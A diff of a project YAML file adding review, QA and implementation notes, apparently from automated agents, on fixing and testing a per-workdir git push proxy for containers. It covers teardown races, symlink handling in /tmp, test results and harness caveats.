+      PYTHONPATH=/workspace. Spec updated with Review iteration 12 refinements. Cross-PR
+      note left on pr-ac12b47 (#143) pointing its stale-proxy cleanup at the new helpers
+      instead of a fresh /tmp sweep. Residual, unchanged and out of scope: in-process
+      refcounts only (cross-process cleanup stays with #241/pr-ac12b47); one daemon
+      per workdir (option (3), workdir-per-request, remains the cleaner long-term
+      design); proxy_is_alive still cannot distinguish a busy daemon from a dead one
+      beyond the backlog of 16; the daemon serves one request at a time, so a long
+      push serialises other requests on the same workdir; a shared stop leaves its
+      .lock beside the kept directory until session teardown. (2026-10-27)'
+    created_at: '2026-10-27T16:36:22Z'
+    last_edited: '2026-10-27T16:36:22Z'
+  - id: note-4287c9c
+    text: 'Review-loop 6280 i2 (2026-10-27): reviewed b0e0550e. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 == 3;
+      and a 4-process concurrent start_push_proxy check yields exactly one socket
+      (R7 across processes, not just threads). One defect found and fixed in the newly
+      hardened teardown area: a long-name discovery symlink was followed whenever
+      its *target* looked like a proxy dir under /tmp owned by us (_is_proxy_dir +
+      st_uid), so a link planted at our long name and pointing at a sibling session
+      dir made stop_session_proxies resolve it, kill that session LIVE proxy and delete
+      the directory its container bind-mounts (reproduced at b0e0550e) and it double-counted.
+      Added _discovery_target/_is_foreign_discovery_link/_drop_foreign_discovery_link:
+      _remove_proxy_dirs, _kill_proxy_socket and _stop_socket_under_lock (checked
+      before taking a lock) unlink such a link and never touch its target; _shared_sock_dir
+      replaces a foreign link so a later registry-less teardown can still find the
+      hashed dir; get_proxy_socket_path ignores a socket reached through a foreign
+      link (the reuse path could otherwise believe its own dead proxy was alive).
+      _kill_proxy_socket now returns a bool and _stop_socket_under_lock propagates
+      it, so the reported/returned stop count is accurate. Tests: 7 new, 5 fail at
+      b0e0550e for the right reason (other live proxy killed; planted link not replaced;
+      lookup returns the other socket); test_teardown_follows_its_own_discovery_link
+      and test_discovery_target_matches_the_hashed_dir pin the legitimate path. tests/test_push_proxy.py
+      + tests/test_container.py: 221 passed. Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace):
+      3809 passed, 1 skipped, 13 failed - all pre-existing environment (12 test_markdown_render
+      without the markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      identical at b0e0550e. Spec updated with Review iteration 13 refinements. Residual,
+      unchanged and out of scope: in-process refcounts only (cross-process cleanup
+      stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the backlog of 16; the daemon serves one
+      request at a time; a shared stop leaves its .lock beside the kept directory
+      until session teardown.'
+    created_at: '2026-10-27T17:08:48Z'
+    last_edited: '2026-10-27T17:08:48Z'
+  - id: note-7f695ba
+    text: 'Review-loop 6280 i3 (2026-10-27): reviewed d872d080 (unchanged since 6280
+      i2). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies fails
+      at 74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Two /tmp leak paths found and fixed, each with a test that fails at d872d080
+      for the right reason: (1) _shared_sock_dir handled a directory and a foreign
+      symlink at the long discovery name but not a regular file squatting it — os.symlink
+      failed silently, no link was ever created, and a later process (empty registry,
+      e.g. after a TUI restart) then had no way to find the hashed directory: stop_session_proxies
+      returned 0 and the proxy plus its socket dir survived the session (reproduced:
+      link created False, dir removed False). The entry is now replaced when it is
+      ours (os.lstat st_uid), foreign ones left alone with the start still succeeding.
+      (2) _remove_proxy_dirs only unlinked symlinks for a non-directory match, so
+      a stale regular file on a proxy-shaped name was never reclaimed; it now goes
+      through _unlink_stale_entry(), which also removes a regular file that is ours.
+      Also: R7 put the start lock next to the socket directory (so rmdir can take
+      the dir), but build_exec_cmd EXIT trap only removed push.sock and proxy.json,
+      leaking /tmp/pm-push-proxy-<container>.lock for every per-container proxy a
+      killed pane tears down — stop_push_proxy cannot clear it either (it returns
+      early once the directory is gone) — so the trap now removes <realpath(sock_dir)>.lock
+      too. Tests: test_start_replaces_a_squatted_discovery_file, test_sweep_removes_a_regular_file_squatting_a_proxy_name,
+      extended test_cleanup_removes_proxy_socket; test_shared_sock_dir_keeps_a_foreign_squatted_file
+      pins the ownership half. tests/test_push_proxy.py + tests/test_container.py:
+      224 passed. Full suite (PATH=/usr/bin:/bin, PYTHONPATH=/workspace): 3825 passed,
+      1 skipped, 0 failed. Logs: /pm-captures/review-6280-i3/. Spec updated with Review
+      iteration 14 refinements. Residual, unchanged and out of scope: in-process refcounts
+      only (cross-process cleanup stays with #241/pr-ac12b47) — note that after a
+      TUI restart a same-workdir container created by another process is still unregistered,
+      so a sibling ref drop can unlink its live socket (dir survives; create_container
+      reuse respawns); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive still cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time; a shared stop still leaves its .lock beside the kept directory until
+      session teardown.'
+    created_at: '2026-10-27T17:38:31Z'
+    last_edited: '2026-10-27T17:38:31Z'
+  - id: note-fba6412
+    text: 'Review-loop 6280 i4 (2026-10-27): reviewed 286b0e5a. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 with assert 1 == 3 (all
+      three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Two fixes applied,
+      each with a test that fails at 286b0e5a for the right reason: (1) an unremovable
+      socket file (a container can leave a root-owned entry in a sticky dir, an immutable
+      file, or a chmod-d dir) raised a bare PermissionError out of both callers -
+      start_push_proxy surfaced it through wrap_claude_cmd as "Is docker running?",
+      and stop_session_proxies aborted the whole sweep so every other proxy of the
+      session survived. _unlink_socket_file now reports whether the path is gone (logging
+      the refusal); both start paths raise PushProxyError naming the stale socket
+      and workdir; _kill_proxy_socket returns False for a socket it could not stop
+      and leaves the daemon sidecar in place (the daemon still serves it), so the
+      sweep continues and the count stays accurate. (2) Documentation that still described
+      the old design: create_container said containers on the same branch share a
+      proxy, and the container git-wrapper comment said HOST_WORKDIR was for multiple
+      scenario containers sharing one - sharing is per workdir now and the path only
+      proves a request names its own clone. Tests: test_kill_proxy_socket_reports_an_unremovable_socket,
+      test_stop_session_survives_an_unremovable_socket, test_start_reports_an_unremovable_socket_as_proxy_error;
+      tests/test_push_proxy.py + tests/test_container.py 227 passed; full suite 3828
+      passed, 1 skipped (PATH=/usr/bin:/bin, PYTHONPATH=/workspace). Logs: /pm-captures/review-6280-i4/.
+      Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); proxy_is_alive cannot distinguish a busy
+      daemon from a dead one beyond the backlog of 16; the daemon serves one request
+      at a time; a shared stop still leaves its .lock beside the kept directory until
+      session teardown.'
+    created_at: '2026-10-27T18:10:50Z'
+    last_edited: '2026-10-27T18:10:50Z'
+  - id: note-24a8bcd
+    text: 'Review-loop 6280 i5 (2026-10-27): reviewed 61389980. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason.
+      One defect fixed: the two remaining teardown paths that take the per-directory
+      start lock (_stop_shared_proxy_socket, and the legacy per-container stop_push_proxy
+      branch) called _start_lock on a socket-dir path that can be a symlink planted
+      in world-writable /tmp; _start_lock resolves the directory, so a planted link
+      made it create and lock <target>.lock next to an arbitrary directory the planter
+      can write. Neither path is ever legitimately a symlink (_shared_sock_dir_path
+      returns the real readable dir or the hashed dir), so both now run _drop_foreign_discovery_link(sock_dir)
+      first — the guard _stop_socket_under_lock already uses — unlinking the link
+      and never its target. Tests: test_shared_stop_does_not_follow_a_planted_symlinked_dir
+      and test_legacy_stop_does_not_follow_a_planted_symlinked_dir both fail at 61389980
+      for the right reason (the victim .lock is created through the planted symlink)
+      and pass at HEAD. tests/test_push_proxy.py + tests/test_container.py: 229 passed.
+      Spec updated with Review iteration 16 refinements. Residual, unchanged and out
+      of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown.'
+    created_at: '2026-10-27T18:32:02Z'
+    last_edited: '2026-10-27T18:32:02Z'
+  - id: note-9c3105e
+    text: 'Review-loop 6280 i6 (2026-10-27): reviewed c5bd5ca9. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason
+      (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock, assert
+      1 == 3), verified this pass in a base-commit worktree. Two fixes applied, each
+      with a test: (1) stop_session_proxies interpolated the session tag raw into
+      its teardown globs. The tag comes from a directory name, so a repo directory
+      "repo[1]" yields the tag "repo[1]-abcd1234", whose "[1]" is a glob character
+      class: after a restart (empty in-process registry, where the glob is the only
+      way to find a proxy) the pattern matched nothing of its own — the proxy and
+      its socket directory survived the session — and it matched a sibling "pm-push-proxy-repo1-abcd1234-..."
+      directory, which the sweep deleted (a cross-session kill of the kind iteration
+      13 guards against). The tag now goes through glob.escape; test_stop_session_escapes_glob_metacharacters_in_the_tag
+      fails with glob.escape neutralised for exactly those reasons (count 0, proxy
+      alive, dir left behind, sibling deleted). (2) Test hygiene: test_stop_all_proxies_skips_a_busy_directory
+      called the real stop_all_proxies(), which sweeps every /tmp/pm-push-proxy-*
+      entry — run on a machine with a live session, the suite would stop that session''s
+      proxies and delete the socket directories its containers bind-mount (S18, the
+      failure this lifecycle prevents). The test now patches _SOCKET_DIR_PREFIX to
+      a test-only value and pins that a stand-in live directory survives. Also re-ran
+      the full lifecycle probe (hashed-dir shared stop keeps the dir and a restart
+      heals in place; SIGKILL leaves a stale socket and the restart respawns it; deleting
+      the socket under a live daemon is detected within one tick; foreign-workdir
+      request rejected) — all correct at HEAD. Tests: tests/test_push_proxy.py + tests/test_container.py
+      231 passed; full suite (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace
+      plus markdown on the path) 3831 passed, 1 skipped, 0 failed. Spec updated with
+      Review iteration 17 refinements. Residual, unchanged and out of scope: in-process
+      refcounts only (cross-process cleanup stays with #241/pr-ac12b47); one daemon
+      per workdir (option (3), workdir-per-request, remains the cleaner long-term
+      design); proxy_is_alive cannot distinguish a busy daemon from a dead one beyond
+      the backlog of 16; the daemon serves one request at a time; a shared stop still
+      leaves its .lock beside the kept directory until session teardown; a running
+      container whose socket directory was deleted and recreated keeps a stale bind
+      mount (the spec records that the host cannot heal it — R6 is what prevents it
+      in normal operation).'
+    created_at: '2026-10-27T19:33:01Z'
+    last_edited: '2026-10-27T19:33:01Z'
+  - id: note-48da8f8
+    text: 'Review-loop 6280 i7 (2026-10-27): reviewed 2f8fcda3. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact).
+      One defect fixed, each with a test that fails at 2f8fcda3 for the right reason:
+      PushProxy.stop() read FileNotFoundError from _owns_socket_path() as "already
+      gone — the unlink below is a no-op" and returned True. A daemon exits exactly
+      when its socket was removed (a shared stop unlinks it and keeps the directory),
+      so a restart for the same workdir could bind a fresh socket at that path in
+      the window between the ownership stat and the unlink — which then deleted the
+      replacement''s socket, leaving the container pointing at a dead socket (the
+      S18 failure through the daemon exit path rather than teardown). _owns_socket_path()
+      now reports a missing/unreadable path as "not owned", so stop() leaves it alone;
+      anything of ours is already gone and the metadata sidecar is best-effort (a
+      later start rewrites it, session teardown removes it). Tests: test_owns_socket_path_is_false_once_removed
+      (returns True at 2f8fcda3) and test_stop_does_not_unlink_a_socket_bound_after_removal
+      (the replacement file is deleted at 2f8fcda3). Also hoisted glob to module level
+      (no behaviour change). tests/test_push_proxy.py + tests/test_container.py: 232
+      passed. Full suite: 3833 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME, PATH=/usr/bin:/bin,
+      PYTHONPATH=/workspace; pytest<9 and markdown installed in a scratch dir). Spec
+      updated with Review iteration 18 refinements. Residual, unchanged and out of
+      scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown;
+      _start_proxy_subprocess leaves a daemon spawned during a readiness timeout running
+      (a later start reuses it).'
+    created_at: '2026-10-27T20:15:48Z'
+    last_edited: '2026-10-27T20:15:48Z'
+  - id: note-18c2d29
+    text: 'Review-loop 6280 i8 (2026-10-27): reviewed 045e2571. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at 74462d76 for the right reason
+      (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock, assert
+      1 == 3). One defect fixed, with a test that fails at 045e2571 for the right
+      reason: (1) _start_lock created the socket directory and then checked it with
+      _sock_dir_start_problem(), but _remove_proxy_dirs can only skip a directory
+      whose start lock is held - and the start has not taken that lock yet at the
+      makedirs/check point. A session sweep racing a container start made the start
+      raise PushProxyError ("push proxy directory ... is unusable ([Errno 2] No such
+      file or directory)"), aborting container creation for a race the caller did
+      not cause (before iteration 9 the daemon own Path(sock).parent.mkdir() recreated
+      the directory, so the start succeeded). The makedirs + check now retry (bounded
+      by _START_DIR_ATTEMPTS) when the entry has vanished; an entry that still exists
+      is still refused, so a planted symlink or foreign directory is unchanged. Test:
+      test_start_recreates_a_dir_a_teardown_removed (fails at 045e2571 with exactly
+      that PushProxyError). Documentation: wrap_claude_cmd pr_id docstring still said
+      containers "on the same branch" share a proxy - the assumption this PR removes
+      (iteration 15 fixed the same wording in create_container and the git-wrapper
+      comment); it now names the workdir. Tests: tests/test_push_proxy.py + tests/test_container.py
+      233 passed; full suite 3834 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME,
+      PATH=/usr/bin:/bin, PYTHONPATH=/workspace; pytest<9 and markdown installed in
+      a scratch dir). Logs: /pm-captures/review-6280-i8/. Spec updated with Review
+      iteration 19 refinements. Incidental (pre-existing, filed as pr-e618b9c, not
+      changed here): the proxy socket is chmod 0o777 in a 0755 directory under world-writable
+      /tmp, so any local user can connect and have the daemon run git push/pull as
+      the host user; R4 narrows it to the proxy own workdir (previously any host path),
+      and closing it needs a private socket root plus a decision on the container-uid
+      assumption. Residual, unchanged and out of scope: in-process refcounts only
+      (cross-process cleanup stays with #241/pr-ac12b47); one daemon per workdir (option
+      (3), workdir-per-request, remains the cleaner long-term design); proxy_is_alive
+      cannot distinguish a busy daemon from a dead one beyond the backlog of 16; the
+      daemon serves one request at a time; a shared stop still leaves its .lock beside
+      the kept directory until session teardown; a blocking start waits on the directory
+      start lock without a deadline.'
+    created_at: '2026-10-27T20:49:41Z'
+    last_edited: '2026-10-27T20:49:41Z'
+  - id: note-7d1da53
+    text: 'Review-loop 6280 i9 (2026-10-27): reviewed 15c41573. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes with real subprocess daemons
+      (distinct socket per workdir, the restarted impl proxy lands the new impl commit,
+      QA stop leaves the impl socket dir intact); test_impl_and_qa_get_distinct_proxies
+      fails at 74462d76 with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Two teardown paths unlinked the long-name discovery symlink while keeping its
+      directory, leaking a hashed socket dir past a registry-less sweep (the iteration-12
+      leak class through the kill/sweep ordering): (1) _kill_proxy_socket unlinked
+      the link before os.rmdir — the socket dir is bind-mounted writable, so a container
+      can leave an entry (or an unremovable socket / a proxy.json directory) that
+      makes the rmdir fail; reproduced: link gone, dir survives. (2) _remove_proxy_dirs
+      unlinked the link before shutil.rmtree(ignore_errors=True); a removal the host
+      cannot complete left the dir with no link. Both now unlink the link only when
+      the directory is actually gone (the sweep logs the refusal). Tests: test_kill_keeps_the_discovery_link_when_the_dir_survives
+      (a leftover file keeps the dir; the link survives and the next registry-less
+      sweep then removes both) and test_sweep_keeps_the_link_when_rmtree_fails (rmtree
+      patched to a no-op); both fail at 15c41573 for the right reason (os.path.islink(long_dir)
+      is False while the dir exists). Tests: tests/test_push_proxy.py + tests/test_container.py
+      235 passed; full suite 3836 passed, 1 skipped, 0 failed (env -u PM_HOST_HOME,
+      PATH=/usr/bin:/bin, PYTHONPATH=/workspace plus pytest<9 and markdown in a scratch
+      dir). Spec updated with Review iteration 20 refinements. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); proxy_is_alive cannot distinguish a busy daemon
+      from a dead one beyond the backlog of 16; the daemon serves one request at a
+      time; a shared stop still leaves its .lock beside the kept directory until session
+      teardown; a blocking start waits on the directory start lock without a deadline;
+      the proxy socket is chmod 0o777 in world-writable /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T21:12:30Z'
+    last_edited: '2026-10-27T21:12:30Z'
+  - id: note-59798e2
+    text: 'Review-loop 6280 i10 (2026-10-27): reviewed 621e4881. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact),
+      and test_impl_and_qa_get_distinct_proxies fails at base 74462d76 with assert
+      1 == 3 (checked this pass in a base worktree). Two fixes applied, each with
+      a test that fails at 621e4881 for the right reason: (1) start_push_proxy created
+      the long-name discovery symlink in _shared_sock_dir *before* taking the start
+      lock, so a stop_session_proxies sweep that removed the hashed dir and its link
+      in that window left a live proxy with no link — unreachable by a later registry-less
+      teardown after a restart (the leak class iterations 5/12/13/14/20 fixed elsewhere).
+      The path now comes from the side-effect-free _shared_sock_dir_path and _shared_sock_dir
+      runs inside the lock; a failed start also no longer leaves a link pointing at
+      a directory it refused. (2) _start_lock called os.makedirs in both modes, so
+      a teardown racing a sweep recreated an empty directory plus a lock file; for
+      a shared stop (which keeps the directory) nothing removed them until the next
+      teardown. blocking=False now yields False when the directory is gone. Tests:
+      test_start_restores_a_discovery_link_a_sweep_removed, test_shared_stop_does_not_resurrect_a_removed_dir.
+      tests/test_push_proxy.py + tests/test_container.py 237 passed; full suite 3838
+      passed, 1 skipped, 0 failed (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace
+      plus pytest<9 and markdown in a scratch dir; log /pm-captures/review-6280-i10/).
+      Spec updated with Review iteration 21 refinements. Residual, unchanged and out
+      of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); proxy_is_alive cannot distinguish a busy daemon from a dead
+      one beyond the backlog of 16; the daemon serves one request at a time; a shared
+      stop still leaves its .lock beside the kept directory until session teardown;
+      a blocking start waits on the directory start lock without a deadline; the proxy
+      socket is chmod 0o777 in world-writable /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T21:41:31Z'
+    last_edited: '2026-10-27T21:41:31Z'
+  - id: note-d6d895e
+    text: 'Review-loop 6280 i11 (2026-10-27): reviewed c03c3aae. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies fails at base 74462d76 with assert 1 ==
+      3 (checked this pass in a base worktree). One bookkeeping defect fixed, with
+      a test that fails at c03c3aae for the right reason: stop_session_proxies reaches
+      one hashed proxy through two candidate paths — the {tag}-* glob (long discovery
+      symlink) and the in-process registry (hashed dir), the latter added by iteration
+      5. When the socket dir survives the first stop (a container can leave an entry
+      in the bind mount, so the per-socket rmdir fails), the second spelling was processed
+      too and _kill_proxy_socket reported a stop for the already-removed socket (a
+      missing socket file counts as gone), so the function returned 2 for one proxy.
+      Candidates are now collapsed by real socket directory before the stop loop.
+      Test: test_stop_session_counts_a_hashed_proxy_once (assert 2 == 1 at c03c3aae).
+      Tests: tests/test_push_proxy.py + tests/test_container.py 238 passed; full suite
+      3839 passed, 1 skipped (env -u PM_HOST_HOME, PATH=/usr/bin:/bin, PYTHONPATH=/workspace;
+      pytest<9 + markdown in a scratch venv). Spec updated with Review iteration 22
+      refinements. Residual, unchanged and out of scope: in-process refcounts only
+      (cross-process cleanup stays with #241/pr-ac12b47); one daemon per workdir (option
+      (3), workdir-per-request, remains the cleaner long-term design); proxy_is_alive
+      cannot distinguish a busy daemon from a dead one beyond the backlog of 16; the
+      daemon serves one request at a time; a shared stop still leaves its .lock beside
+      the kept directory until session teardown; a blocking start waits on the directory
+      start lock without a deadline; the proxy socket is chmod 0o777 in world-writable
+      /tmp (filed as pr-e618b9c).'
+    created_at: '2026-10-27T22:17:03Z'
+    last_edited: '2026-10-27T22:17:03Z'
+  - id: note-3c66775
+    text: 'QA S1 (2026-10-27, container mode, nested podman, real file:// upstream):
+      PASS. Impl and QA containers on one PR got distinct workdir-keyed proxies —
+      impl proxy recorded the PR workdir, QA proxy the QA scenario clone; each container
+      saw its own /run/pm-push-proxy/push.sock and `git ls-remote origin` worked from
+      both; the QA start left the impl socket mount and proxy pid unchanged. impl
+      push -> QA push -> impl push 2 each landed its own commit upstream, each a fast-forward
+      of the previous, and the other clone branch ref never moved. Two scenario-script
+      caveats for the next run: (1) the literal glob /tmp/pm-push-proxy-<tag>-<prid>-*
+      also matches each proxy start-lock sibling <sockdir>.lock — filter to directories
+      to get the expected 2; (2) `git rev-parse --verify --quiet <full-sha>` returns
+      0 and echoes the SHA even for a nonexistent object, so use `git cat-file -e`
+      for the "commit absent from the other clone" checks. Captures: /pm-captures/scenarios/1/{impl-launch,qa-launch,verify-push}.
+      Setup note: pm-dev:latest had to be built inside the QA container first (`pm
+      container build-base`); nested podman needs --uts=host, which pm adds under
+      nested_podman.'
+    created_at: '2026-10-27T23:49:26Z'
+    last_edited: '2026-10-27T23:49:26Z'
+  - id: note-d558aed
+    text: 'Refiner note (QA scenario 4, 2026-10-27): the drafted recovery step ("reopen
+      the implementation session") cannot be driven by closing the impl window and
+      re-running `pm pr start`. build_exec_cmd wraps the impl pane in `bash -c "trap
+      ...; podman exec -it <ctr> ..."` with cleanup=True, so when the pane dies the
+      EXIT trap runs `podman rm -f <impl-ctr>` and the container is gone; and while
+      the impl window exists, `pm pr start` short-circuits on `find_window_by_name`
+      and never re-runs create_container. Refined recovery re-runs the same container-start
+      path by starting the review session on the same PR workdir (`pm pr review --fresh
+      <pr>`): same session tag + pr id + realpath(workdir) => same proxy key, so start_push_proxy
+      respawns the socket in the same bind-mounted directory while the impl container
+      keeps running (verify by unchanged container Id/StartedAt). Fixture requirements
+      verified: bare upstream must be addressed via a file:// URL (plain local-path
+      origins are refused by design), the PR entry must be committed on the base branch
+      (pm push then merge pm/sync-* into master, else pm pr start refuses with "not
+      committed on master yet"), and the test tmux session must be started with TMUX
+      unset (or on a private PM_TMUX_SOCKET) so `pm session` does not adopt the outer
+      session.'
+    created_at: '2026-10-27T23:32:33Z'
+    last_edited: '2026-10-27T23:32:33Z'
+  - id: note-cfb7a13
+    text: 'QA S4 (2026-10-28, container mode, nested podman): PASS. All four stories
+      verified against a throwaway project (fixture PR pr-4b110cf) with a file://
+      bare upstream: lost socket -> push exits 1 with "git-proxy: cannot connect:
+      [Errno 2] No such file or directory", upstream unchanged, local-only commit,
+      container id/StartedAt unchanged, mount has no push.sock; pm pr review --fresh
+      (same tag/pr/realpath(workdir)) respawns the socket in the same bind-mounted
+      dir with a new pid and the existing container pushes again; SIGKILLed daemon
+      (stale socket) -> "[Errno 111] Connection refused", then the same heal replaces
+      the stale entry; wrong-branch/--all/--mirror/--tags/--upload-pack/local-path-origin/foreign-workdir
+      requests all rejected with the expected explicit messages and nothing pushed.
+      Regression test test_impl_and_qa_get_distinct_proxies passes at HEAD. Driver
+      caveat for the next run: the in-container git wrapper only intercepts when $1
+      is push/fetch/pull/ls-remote, so `podman exec $CTR git -C /workspace push ...`
+      bypasses the proxy (pre-existing, out of scope) - drive pushes as `podman exec
+      $CTR bash -c "cd /workspace && git push ..."`. Captures: /pm-captures/scenarios/4/{story12-socket-loss-heal,story3-daemon-crash-heal,story4-refusals}.'
+    created_at: '2026-10-28T00:04:59Z'
+    last_edited: '2026-10-28T00:04:59Z'
+  - id: note-6a3426f
+    text: 'QA scenario 5 (2026-10-28): PASS. Harness prerequisites for a re-run: (1)
+      the fake-claude qa_planning body must NOT include QA_PLAN_START/QA_PLAN_END
+      — fake-claude appends the markers itself, and including them makes the planner
+      poll reject the plan as ''already-closed block (plan truncated)''; (2) the QA
+      worker''s ~/.local/bin/git wrapper forwards fetch/pull/ls-remote to a host workdir
+      that cannot resolve this container''s /scratch paths, so install a /tmp/pm-venv/bin/git
+      shim that always execs /usr/bin/git before running pm (the scenario upstreams
+      are local file:// repos). Verified: shared stop of the s1 QA scenario removed
+      its socket+proxy.json and kept the dir+discovery link, s2/impl proxies kept
+      serving and pushed, session kill removed every trace (links, dirs, locks, daemons,
+      containers), and killing project A left project B''s proxy/pid/socket intact
+      with its push still working.'
+    created_at: '2026-10-28T00:20:51Z'
+    last_edited: '2026-10-28T00:20:51Z'
+  - id: note-430b16a
+    text: 'Concretizer (scenario 6), 2026-10-27: container names embed the session
+      tag verbatim and podman rejects [ ] * ? in names ("names must match [a-zA-Z0-9][a-zA-Z0-9_.-]*").
+      So a glob-bearing project dir can never launch a container-mode session: pm
+      pr start starts the shared push proxy, then podman run --name pm-<tag>-impl-<pr>
+      fails with the generic "Is podman running?" ContainerError, leaving the hashed
+      proxy dir + long-name discovery link + lock in /tmp. Scenario 6 story 3 is driven
+      from exactly that state: pm session kill must sweep all three via the glob-escaped
+      tag discovery-link glob while a sibling session proxy stays live (verified end-to-end
+      at HEAD). Container names are not sanitized here; if that is wanted it is a
+      separate fix. Sandbox notes: run pm container build-base from the throwaway
+      project dir after nested_podman:true (~3 min under nested podman); the sandbox
+      ~/.local/bin/git wrapper must not precede /usr/bin in PATH for host-side pm
+      commands, since it forwards push/fetch/pull/ls-remote to the host workdir.'
+    created_at: '2026-10-27T23:32:42Z'
+    last_edited: '2026-10-27T23:32:42Z'
+  - id: note-472d7a9
+    text: 'Impl (2026-10-28): sign-off routed this back (SIGNOFF_IMPL) for the master@f2650b46
+      integration conflict. Resolved in merge commit fa3d7678. The only conflict was
+      the single project.active_pr scalar; kept master''s pr-e102089, because both
+      sides had set active_pr only as a side-effect of filing a new PR entry (ours
+      pr-e618b9c, master pr-e102089) and neither was a deliberate focus decision.
+      Both PR entries and every note on both sides are preserved (501 PRs, identical
+      per-id content, note-id union verified against both parents, project.yaml loads
+      cleanly through pm_core.store with validation). No code change: the push-proxy
+      fix is unchanged, so the QA evidence at dfa769cb still holds. Tests at the merge:
+      tests/test_push_proxy.py + tests/test_container.py 238 passed; full suite 3911
+      passed, 1 skipped, 0 failed.'
+    created_at: '2026-10-28T01:12:34Z'
+    last_edited: '2026-10-28T01:12:34Z'
+  - id: note-4f0be23
+    text: 'QA S8 (2026-10-28, container mode, nested podman): PASS at d766d5c4. Registry
+      intact: pm pr list exit 0 / 501 lines / active marker on pr-e102089; pm pr show
+      x3 (Title/Status/Branch, no Workdir); pm pr note list 29 notes, first note-6245c1d,
+      last note-472d7a9, first 28 identical+ordered vs dfa769cb. Tests: both modules
+      238 passed (174 s); repro 1 passed at candidate, 1 failed at base 74462d76 with
+      assert 1 == 3 at tests/test_push_proxy.py:1170 (all three on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Container mode: impl + QA scenario on one PR got distinct workdir-keyed proxies
+      (same pm-push-proxy-<tag>-<pr>- prefix, tokens dbf479b8dca77bac / 46c02c37d67bf3fd),
+      exactly two, impl mount+pid unchanged by the QA start, both ls-remote exit 0,
+      and impl A -> qa B -> impl C each landed its own commit as a fast-forward with
+      neither clone local ref moved by the other push. Teardown (C-c, pm container
+      cleanup --pr, pm session kill) removed both containers, both proxy dirs, and
+      both daemons self-exited within 5 s. HARNESS PREREQUISITE for the next container-mode
+      run (the S5 note is insufficient here): the sandbox ~/.local/bin/git wrapper
+      has HOST_WORKDIR baked to this scenario host workdir and forwards push/fetch/pull/ls-remote
+      to the real host, which cannot resolve a container-local file:// upstream (/tmp/tmp.*/upstream.git)
+      - pm qa run then dies in the planner handoff with "does not appear to be a git
+      repository" / Result: INPUT_REQUIRED. A /tmp/pm-venv/bin/git shim does NOT help:
+      the pm-created pane PATH is ~/.local/bin:/home/pm/.local/share/pm/venv/bin:/usr/local/bin:...
+      and never includes /tmp/pm-venv/bin. What works: back up ~/.local/bin/git and
+      replace it with a shim that execs /usr/bin/git (restore afterwards). That does
